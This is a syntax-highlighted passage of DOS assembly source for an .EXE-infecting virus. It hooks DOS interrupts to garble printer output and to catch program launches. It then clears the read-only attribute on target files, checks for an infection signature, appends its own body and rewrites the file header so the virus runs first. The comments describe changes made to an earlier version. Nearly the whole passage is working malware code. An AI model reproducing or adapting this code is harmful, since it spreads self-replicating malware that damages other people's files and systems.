</span><span class="sc5">T6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; reached the top ?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">T7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Reached top - now go downwards</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">UPDOWN</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">T7</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">VMODE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">T8</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">LEFTRIGHT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">T8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">T9</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">LEFTRIGHT</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Set cursor position to new position of ball</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">T9</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYLINE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">MYCOL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Get what is there and store it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">ONSCREEN</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Write character (lower case o)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">6FH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       And restore cursor position</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRLINE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SCRCOL</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Restore registers and quit</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TXEX</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD8</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       New INT 17 routine. Garble all outgoing characters.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW17</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">P0</span><span class="sc0">
</span><span class="sc5">DO17</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD17</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">P0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ERRTAB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">DO17</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        This is the INT 21 replacement. It only does something in the case</span><span class="sc0">
</span><span class="sc1">;        of an EXEC call.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">NEW21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4BH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">     </span><span class="sc5">L5</span><span class="sc0">
</span><span class="sc5">DO21</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">     </span><span class="sc2">0EAH</span><span class="sc0">
</span><span class="sc5">OLD21</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       The code to only infect every tenth program has been removed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Search for the file name extension ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">        </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">         </span><span class="sc5">L8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">        </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">        </span><span class="sc5">L6</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        ... and quit unless it starts with "EX".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L7</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">        </span><span class="sc5">DO21</span><span class="sc0">
</span><span class="sc5">L8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">INC</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">        </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">5845H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">        </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        When an .EXE file is found, the virus starts by turning off</span><span class="sc0">
</span><span class="sc1">;        the read-only attribute. The read-only attribute is not restored</span><span class="sc0">
</span><span class="sc1">;        when the file has been infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4300H</span><span class="sc0">                </span><span class="sc1">; Get attribute</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">         </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">                </span><span class="sc1">; Set attribute</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">         </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Next, the file is examined to see if it is already infected.</span><span class="sc0">
</span><span class="sc1">;         The signature (4418 5F19) is stored in the last two words.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3D02H</span><span class="sc0">                </span><span class="sc1">; Open / write access</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">         </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                        </span><span class="sc1">; file handle in BX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This part of the code is new: Get date of file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DATE1</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DATE2</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">                        </span><span class="sc1">; now DS is no longer needed</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The header of the file is read in at [ID+8]. The virus then</span><span class="sc0">
</span><span class="sc1">;        modifies itself, according to the information stored in the</span><span class="sc0">
</span><span class="sc1">;        header. (The original CS and IP addressed are stored).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1CH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">        </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1CH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ORG_IP</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1EH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">ORG_CS</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Next the read/write pointer is moved to the end of the file-4,</span><span class="sc0">
</span><span class="sc1">;        and the last 4 bytes read. They are compared to the signature,</span><span class="sc0">
</span><span class="sc1">;        and if equal nothing happens.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">        </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">        </span><span class="sc5">L8A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">L8A</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       This part of the virus is new - check if it is below minimum length</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">L8B</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JG</span><span class="sc0">      </span><span class="sc5">L8B</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">L9</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc5">L8B</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">        </span><span class="sc5">L11</span><span class="sc0">
</span><span class="sc5">L9</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
</span><span class="sc5">L10</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0">        </span><span class="sc5">L7</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Compare to 4418,5F19</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">494DH</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">        </span><span class="sc5">L12</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3158H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">        </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The file is not infected, so the next thing the virus does is</span><span class="sc0">
</span><span class="sc1">;        infecting it. First it is padded so the length becomes a multiple</span><span class="sc0">
</span><span class="sc1">;        of 16 bytes. Tis is probably done so the virus code can start at a</span><span class="sc0">
</span><span class="sc1">;        paragraph boundary.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">        </span><span class="sc5">L13</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">        </span><span class="sc5">L12A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L12A</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">        </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Next the main body of the virus is written to the end.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">L13</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Was:   XOR        DX,DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ID</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">        </span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">        </span><span class="sc5">L9</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Next the .EXE file header is modified:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0">   </span><span class="sc5">F0</span><span class="sc0">              </span><span class="sc1">; some unnecessary instructions</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">
</span><span class="sc1">;        First modify initial IP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">F0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc9">LABEL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">ID</span><span class="sc4">[</span><span class="sc2">1CH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Modify starting CS = Virus CS. It is computed as:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        (Original length of file+padding)/16 - Start of load module</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_HI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">LEN_LO</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">        </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">CONST1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Modified a bit</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">RCR</span><span class="sc0">        </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0">        </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
